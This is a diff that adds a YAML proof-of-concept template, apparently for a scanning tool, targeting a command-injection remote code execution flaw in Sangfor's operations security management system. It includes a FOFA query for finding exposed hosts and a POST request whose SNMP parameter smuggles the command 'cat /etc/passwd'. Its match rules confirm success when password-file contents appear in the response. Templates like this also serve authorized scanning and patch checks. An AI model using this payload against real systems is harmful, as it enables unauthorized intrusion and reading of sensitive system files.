@@ -1,0 +1,29 @@
+id: poc-yaml-sangfor-omsms-save-snmp-rce
+info:
+  name: 深信服运维安全管理系统 save_SNMP 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 深信服运维安全管理系统
+  fofa: body="/fort/login" && header="FORTSESSIONID"
+requests:
+- method: POST
+  path: /fort/system;help/SNMP/save_SNMP
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: SNMPedition=v3&SNMPsecurityLevel=authPriv&SNMPYhName=testuser&SNMPRzPw=test&SNMPJmPw=test&SNMPJmSf=AES&SNMPRzSf=MD5;cat+/etc/passwd;&SNMPAddress=127.0.0.1
+  expression: 'status_code == 200 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin") &&
+
+    contains(body,"\"success\":\"success\"") &&
+
+    contains(content_type,"application/json") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
